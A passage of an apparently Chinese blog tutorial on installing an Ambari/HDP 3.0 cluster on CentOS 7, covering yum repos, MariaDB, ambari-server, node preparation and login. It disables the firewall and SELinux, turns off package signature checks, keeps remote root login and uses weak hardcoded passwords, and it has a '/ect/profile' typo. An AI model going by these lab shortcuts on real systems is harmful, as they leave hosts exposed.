class="line">tar -zxvf HDP-3.0.0.0-centos7-rpm.tar.gz -C /var/www/html/hdp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就可以通过 http 的方式获取到相应的 rpm 文件和 repodata 文件来配置 yum 源了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 配置ambari的yum源</span></span><br><span class="line">vi /etc/yum.repos.d/ambari.repo</span><br><span class="line">[ambari]</span><br><span class="line">name=ambari</span><br><span class="line">baseurl=http://172.18.74.160/centos7/2.7.0.0-897/</span><br><span class="line">gpgcheck=0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">配置hdp和hdp-utils的yum源</span></span><br><span class="line">vi /etc/yum.repos.d/hdp.repo</span><br><span class="line">[HDP]</span><br><span class="line">name=HDP</span><br><span class="line">baseurl=http://172.18.74.160/hdp/HDP/centos7/3.0.0.0-1634/</span><br><span class="line">gpgcheck=0</span><br><span class="line">[HDP-UTILS]</span><br><span class="line">name=HDP_UTILS</span><br><span class="line">baseurl=http://172.18.74.160/hdp-utils/HDP-UTILS/centos7/1.1.0.22/</span><br><span class="line">gpgcheck=0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line">yum repolist</span><br></pre></td></tr></table></figure><p>将 yum 文件使用 scp 发送到客户端节点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp /etc/yum.repos.d/ambari.repo hdp-1:/etc/yum.repos.d/</span><br><span class="line">scp /etc/yum.repos.d/hdp.repo hdp-1:/etc/yum.repos.d/</span><br></pre></td></tr></table></figure><h3 id="53数据库配置"><a class="markdownIt-Anchor" href="#53数据库配置">#</a> 5.3. 数据库配置</h3><p>数据库使用 MariaDB 作为元数据储存的库，存放 ambari 服务数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y mariadb-server</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 开机自启</span></span><br><span class="line">systemctl start mariadb &amp;&amp; systemctl enable mariadb</span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化</span></span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@ambari</span> <span class="string">~]# mysql_secure_installation </span></span><br><span class="line"></span><br><span class="line"><span class="attr">NOTE</span>: <span class="string">RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB</span></span><br><span class="line">      <span class="attr">SERVERS</span> <span class="string">IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!</span></span><br><span class="line"></span><br><span class="line"><span class="attr">In</span> <span class="string">order to log into MariaDB to secure it, we&#x27;ll need the current</span></span><br><span class="line"><span class="attr">password</span> <span class="string">for the root user.  If you&#x27;ve just installed MariaDB, and</span></span><br><span class="line"><span class="attr">you</span> <span class="string">haven&#x27;t set the root password yet, the password will be blank,</span></span><br><span class="line"><span class="attr">so</span> <span class="string">you should just press enter here.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Enter</span> <span class="string">current password for root (enter for none): </span></span><br><span class="line"><span class="meta">OK,</span> <span class="string">successfully used password, moving on...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Setting</span> <span class="string">the root password ensures that nobody can log into the MariaDB</span></span><br><span class="line"><span class="attr">root</span> <span class="string">user without the proper authorisation.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Set</span> <span class="string">root password? [Y/n] </span></span><br><span class="line"><span class="attr">New</span> <span class="string">password: </span></span><br><span class="line"><span class="meta">Re-enter</span> <span class="string">new password: </span></span><br><span class="line"><span class="attr">Password</span> <span class="string">updated successfully!</span></span><br><span class="line"><span class="attr">Reloading</span> <span class="string">privilege tables..</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">By</span> <span class="string">default, a MariaDB installation has an anonymous user, allowing anyone</span></span><br><span class="line"><span class="attr">to</span> <span class="string">log into MariaDB without having to have a user account created for</span></span><br><span class="line"><span class="meta">them.</span>  <span class="string">This is intended only for testing, and to make the installation</span></span><br><span class="line"><span class="attr">go</span> <span class="string">a bit smoother.  You should remove them before moving into a</span></span><br><span class="line"><span class="attr">production</span> <span class="string">environment.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Remove</span> <span class="string">anonymous users? [Y/n] </span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"><span class="meta">Normally,</span> <span class="string">root should only be allowed to connect from &#x27;localhost&#x27;.  This</span></span><br><span class="line"><span class="attr">ensures</span> <span class="string">that someone cannot guess at the root password from the network.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Disallow</span> <span class="string">root login remotely? [Y/n] n</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">skipping.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">By</span> <span class="string">default, MariaDB comes with a database named &#x27;test&#x27; that anyone can</span></span><br><span class="line"><span class="meta">access.</span>  <span class="string">This is also intended only for testing, and should be removed</span></span><br><span class="line"><span class="attr">before</span> <span class="string">moving into a production environment.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Remove</span> <span class="string">test database and access to it? [Y/n] </span></span><br><span class="line"> <span class="meta">-</span> <span class="string">Dropping test database...</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"> <span class="meta">-</span> <span class="string">Removing privileges on test database...</span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Reloading</span> <span class="string">the privilege tables will ensure that all changes made so far</span></span><br><span class="line"><span class="attr">will</span> <span class="string">take effect immediately.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Reload</span> <span class="string">privilege tables now? [Y/n] </span></span><br><span class="line"> <span class="meta">...</span> <span class="string">Success!</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Cleaning</span> <span class="string">up...</span></span><br><span class="line"></span><br><span class="line"><span class="attr">All</span> <span class="string">done!  If you&#x27;ve completed all of the above steps, your MariaDB</span></span><br><span class="line"><span class="attr">installation</span> <span class="string">should now be secure.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Thanks</span> <span class="string">for using MariaDB!</span></span><br></pre></td></tr></table></figure><h4 id="531创建数据库"><a class="markdownIt-Anchor" href="#531创建数据库">#</a> 5.3.1. 创建数据库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建amabri数据库</span></span><br><span class="line">create database ambari;</span><br><span class="line"><span class="meta">#</span><span class="bash">授权</span></span><br><span class="line">grant all on ambari.* to ambari@&#x27;%&#x27; identified by &#x27;bigdata&#x27;;</span><br><span class="line">grant all on ambari.* to ambari@localhost identified by &#x27;bigdata&#x27;;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用ambari-server提供的sql脚本创建相关的表</span></span><br><span class="line">use ambari;</span><br><span class="line">source /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</span><br></pre></td></tr></table></figure><h4 id="532将jdbc驱动包复制到指定目录usrsharejava"><a class="markdownIt-Anchor" href="#532将jdbc驱动包复制到指定目录usrsharejava">#</a> 5.3.2. 将 JDBC 驱动包复制到指定目录（/usr/share/java）</h4><p>将 jdbc 的驱动包使用 sftp 工具上传到 ambari</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv mysql-connector-java-*.jar /usr/share/java/mysql-connector-java.jar</span><br><span class="line">ambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar</span><br></pre></td></tr></table></figure><h3 id="54安装ambari-server"><a class="markdownIt-Anchor" href="#54安装ambari-server">#</a> 5.4. 安装 ambari-server</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y ambari-server</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置ambari-server</span></span><br><span class="line">ambari-server setup</span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[root@hdp-1</span> <span class="string">~]# ambari-server setup</span></span><br><span class="line"><span class="attr">Using</span> <span class="string">python  /usr/bin/python</span></span><br><span class="line"><span class="attr">Setup</span> <span class="string">ambari-server</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">SELinux...</span></span><br><span class="line"><span class="attr">SELinux</span> <span class="string">status is &#x27;enabled&#x27;</span></span><br><span class="line"><span class="attr">SELinux</span> <span class="string">mode is &#x27;permissive&#x27;</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">SELinux is set to &#x27;permissive&#x27; mode and temporarily disabled.</span></span><br><span class="line"><span class="attr">OK</span> <span class="string">to continue [y/n] (y)? y</span></span><br><span class="line"><span class="attr">Customize</span> <span class="string">user account for ambari-server daemon [y/n] (n)? y</span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">user account for ambari-server daemon (root):</span></span><br><span class="line"><span class="attr">Adjusting</span> <span class="string">ambari-server permissions and ownership...</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">firewall status...</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">JDK...</span></span><br><span class="line"><span class="meta">[1]</span> <span class="string">Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8</span></span><br><span class="line"><span class="meta">[2]</span> <span class="string">Custom JDK</span></span><br><span class="line">==============================================================================</span><br><span class="line"><span class="attr">Enter</span> <span class="string">choice (1): 2</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">JCE Policy files are required for configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.</span></span><br><span class="line"><span class="attr">Path</span> <span class="string">to JAVA_HOME: /opt/jdk1.8.0_171/</span></span><br><span class="line"><span class="attr">Validating</span> <span class="string">JDK on Ambari Server...done.</span></span><br><span class="line"><span class="attr">Check</span> <span class="string">JDK version for Ambari Server...</span></span><br><span class="line"><span class="attr">JDK</span> <span class="string">version found: 8</span></span><br><span class="line"><span class="attr">Minimum</span> <span class="string">JDK version is 8 for Ambari. Skipping to setup different JDK for Ambari Server.</span></span><br><span class="line"><span class="attr">Checking</span> <span class="string">GPL software agreement...</span></span><br><span class="line"><span class="attr">GPL</span> <span class="string">License for LZO: https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html</span></span><br><span class="line"><span class="attr">Enable</span> <span class="string">Ambari Server to download and install GPL Licensed LZO packages [y/n] (n)? </span></span><br><span class="line"><span class="attr">Completing</span> <span class="string">setup...</span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">database...</span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">advanced database configuration [y/n] (n)? y</span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">database...</span></span><br><span class="line">==============================================================================</span><br><span class="line"><span class="attr">Choose</span> <span class="string">one of the following options:</span></span><br><span class="line"><span class="meta">[1]</span> <span class="string">- PostgreSQL (Embedded)</span></span><br><span class="line"><span class="meta">[2]</span> <span class="string">- Oracle</span></span><br><span class="line"><span class="meta">[3]</span> <span class="string">- MySQL / MariaDB</span></span><br><span class="line"><span class="meta">[4]</span> <span class="string">- PostgreSQL</span></span><br><span class="line"><span class="meta">[5]</span> <span class="string">- Microsoft SQL Server (Tech Preview)</span></span><br><span class="line"><span class="meta">[6]</span> <span class="string">- SQL Anywhere</span></span><br><span class="line"><span class="meta">[7]</span> <span class="string">- BDB</span></span><br><span class="line">==============================================================================</span><br><span class="line"><span class="attr">Enter</span> <span class="string">choice (1): 3</span></span><br><span class="line"><span class="attr">Hostname</span> <span class="string">(localhost): </span></span><br><span class="line"><span class="attr">Port</span> <span class="string">(3306): </span></span><br><span class="line"><span class="attr">Database</span> <span class="string">name (ambari): </span></span><br><span class="line"><span class="attr">Username</span> <span class="string">(ambari): </span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">Database Password (bigdata): </span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">ambari database...</span></span><br><span class="line"><span class="attr">Should</span> <span class="string">ambari use existing default jdbc /usr/share/java/mysql-connector-java.jar [y/n] (y)? </span></span><br><span class="line"><span class="attr">Configuring</span> <span class="string">remote database connection properties...</span></span><br><span class="line"><span class="attr">WARNING</span>: <span class="string">Before starting Ambari Server, you must run the following DDL against the database to create the schema: /var/lib/ambari-server/resources/Ambari-DDL-MySQL-CREATE.sql</span></span><br><span class="line"><span class="attr">Proceed</span> <span class="string">with configuring remote database connection properties [y/n] (y)? </span></span><br><span class="line"><span class="attr">Extracting</span> <span class="string">system views...</span></span><br><span class="line"><span class="attr">ambari-admin-2.7.0.0.897.jar</span></span><br><span class="line"><span class="attr">....</span></span><br><span class="line"><span class="attr">Ambari</span> <span class="string">repo file doesn&#x27;t contain latest json url, skipping repoinfos modification</span></span><br><span class="line"><span class="attr">Adjusting</span> <span class="string">ambari-server permissions and ownership...</span></span><br><span class="line"><span class="attr">Ambari</span> <span class="string">Server &#x27;setup&#x27; completed successfully.</span></span><br></pre></td></tr></table></figure><h3 id="55启动ambari-server"><a class="markdownIt-Anchor" href="#55启动ambari-server">#</a> 5.5 启动 ambari-server</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ambari-server start</span><br></pre></td></tr></table></figure><p>可以访问 ambari 的 web 界面: <a href="http://172.18.74.160:8080">http://172.18.74.160:8080</a></p><h2 id="6client端环境配置"><a class="markdownIt-Anchor" href="#6client端环境配置">#</a> 6.Client 端环境配置</h2><p>说明：以下配置是在需要安装集群的各个节点中进行，此处为 hdp-1,hdp-2,hdp-3。</p><h3 id="61修改主机名和配置主机到ip的映射所有节点"><a class="markdownIt-Anchor" href="#61修改主机名和配置主机到ip的映射所有节点">#</a> 6.1 修改主机名和配置主机到 IP 的映射 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 分别修改三台机器的主机名</span></span><br><span class="line">hostnamectl set-hostname hdp-1</span><br><span class="line">hostnamectl set-hostname hdp-2</span><br><span class="line">hostnamectl set-hostname hdp-3</span><br><span class="line"><span class="meta">#</span><span class="bash">立即生效</span></span><br><span class="line">bash</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置主机名到IP的映射</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">172.18.74.160 ambari</span><br><span class="line">172.18.74.161 hdp-1</span><br><span class="line">172.18.74.162 hdp-2</span><br><span class="line">172.18.74.163 hdp-3</span><br></pre></td></tr></table></figure><h3 id="62关闭防火墙和关闭selinux所有节点"><a class="markdownIt-Anchor" href="#62关闭防火墙和关闭selinux所有节点">#</a> 6.2 关闭防火墙和关闭 SELinux (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 关闭防火墙</span></span><br><span class="line">systemctl stop firewalld &amp;&amp; systemctl disable firewalld</span><br><span class="line"><span class="meta">#</span><span class="bash"> 关闭selinux</span></span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">SELINUX=disabled</span><br></pre></td></tr></table></figure><h3 id="63配置免密登录所有节点"><a class="markdownIt-Anchor" href="#63配置免密登录所有节点">#</a> 6.3. 配置免密登录 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> hpd-1</span></span><br><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id hdp-1</span><br><span class="line">ssh-copy-id hdp-2</span><br><span class="line">ssh-copy-id hdp-3</span><br><span class="line"><span class="meta">#</span><span class="bash"> hdp-2</span></span><br><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id hdp-1</span><br><span class="line">ssh-copy-id hdp-2</span><br><span class="line">ssh-copy-id hdp-3</span><br><span class="line"><span class="meta">#</span><span class="bash"> hdp-3</span></span><br><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id hdp-1</span><br><span class="line">ssh-copy-id hdp-2</span><br><span class="line">ssh-copy-id hdp-3</span><br></pre></td></tr></table></figure><h3 id="64安装时间同步服务ntp"><a class="markdownIt-Anchor" href="#64安装时间同步服务ntp">#</a> 6.4. 安装时间同步服务 ntp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">hdp-1</span></span><br><span class="line">yum install -y ntp</span><br><span class="line">vi /etc/ntp.conf</span><br><span class="line">server 127.127.1.0</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line">systemctl start ntpd</span><br><span class="line">systemctl enable ntpd</span><br><span class="line"><span class="meta">#</span><span class="bash">hdp-2</span></span><br><span class="line">yum install -y ntpdate</span><br><span class="line">ntpdate hdp-1</span><br><span class="line"><span class="meta">#</span><span class="bash">hdp-3</span></span><br><span class="line">yum install -y ntpdate</span><br><span class="line">ntpdate hdp-1</span><br></pre></td></tr></table></figure><h3 id="65关闭大页面压缩所有节点"><a class="markdownIt-Anchor" href="#65关闭大页面压缩所有节点">#</a> 6.5 关闭大页面压缩 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br><span class="line">echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br></pre></td></tr></table></figure><h3 id="66安装配置jdk"><a class="markdownIt-Anchor" href="#66安装配置jdk">#</a> 6.6. 安装配置 JDK</h3><p>将 jdk 的安装包上传到 hdp-1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置环境变量</span></span><br><span class="line">vi /etc/profile</span><br><span class="line">export JAVA_HOME=/usr/local/jdk</span><br><span class="line">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class="line">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br><span class="line"><span class="meta">#</span><span class="bash"> 刷新环境变量</span></span><br><span class="line">source /ect/profile</span><br><span class="line">java</span><br><span class="line"><span class="meta">#</span><span class="bash"> 将jdk和环境变量发送到其它机器</span></span><br><span class="line">scp -r /usr/local/jdk  hdp-2:/usr/local/</span><br><span class="line">scp -r /usr/local/jdk  hdp-3:/usr/local/</span><br><span class="line">scp  /etc/profile hdp-2:/etc/</span><br><span class="line">scp  /etc/profile hdp-3:/etc/</span><br><span class="line"><span class="meta">#</span><span class="bash"> hdp-2 hdp-3</span></span><br><span class="line">source /ect/profile</span><br><span class="line">java</span><br></pre></td></tr></table></figure><h3 id="67安装必要软件所有节点"><a class="markdownIt-Anchor" href="#67安装必要软件所有节点">#</a> 6.7. 安装必要软件 (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum -y install libtirpc-devel</span><br><span class="line">yum -y install psmisc</span><br><span class="line">yum -y install redhat-lsb</span><br><span class="line">yum -y install nc</span><br><span class="line">yum -y install gcc</span><br><span class="line">yum -y install python-devel</span><br><span class="line">yum -y install python-kerberos-1.1-15.el7.x86_64</span><br><span class="line">yum -y install rpcbind-0.2.0-49.el7.x86_64</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="68安装mysql数据库hdp-2安装hive可选"><a class="markdownIt-Anchor" href="#68安装mysql数据库hdp-2安装hive可选">#</a> 6.8. 安装 MySQL 数据库 (hdp-2，安装 Hive 可选)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y mariadb-server</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动 开机自启</span></span><br><span class="line">systemctl start mariadb &amp;&amp; systemctl enable mariadb</span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化</span></span><br><span class="line">mysql_secure_installation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入数据库</span></span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create database hive;</span><br><span class="line">create user &quot;hive&quot;@&quot;%&quot; identified by &quot;hive&quot;;</span><br><span class="line">grant all privileges on hive.* to &#x27;hive&#x27;@&#x27;%&#x27; identified by &#x27;hive&#x27;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h3 id="69安装和配置ambari-agent所有节点"><a class="markdownIt-Anchor" href="#69安装和配置ambari-agent所有节点">#</a> 6.9. 安装和配置 ambari-agent (所有节点)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line">yum install -y ambari-agent</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置</span></span><br><span class="line">vi /etc/ambari-agent/conf/ambari-agent.ini </span><br><span class="line">[server]</span><br><span class="line">hostname=ambari</span><br><span class="line"><span class="meta">#</span><span class="bash">启动</span></span><br><span class="line">ambari-agent start</span><br></pre></td></tr></table></figure><h1 id="7hdp部署"><a class="markdownIt-Anchor" href="#7hdp部署">#</a> 7.HDP 部署</h1><h2 id="71登录"><a class="markdownIt-Anchor" href="#71登录">#</a> 7.1 登录</h2><p>在浏览器中访问 <a href="http://172.18.74.160:8080">http://172.18.74.160:8080</a></p><p>默认的用户名和密码都是 admin</p><p><img "" class="lazyload placeholder" data-original="image-20211009131454796.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211009131454796"></p><h2 id="72配置集群"><a class="markdownIt-Anchor" href="#72配置集群">#</a> 7.2 配置集群</h2><p><img "" class="lazyload placeholder" data-original="20201010141301559.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141325856.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="202010101414045.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141418882.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141433923.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="在这里插入图片描述"></p><p><img "" class="lazyload placeholder" data-original="20201010141454782.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" 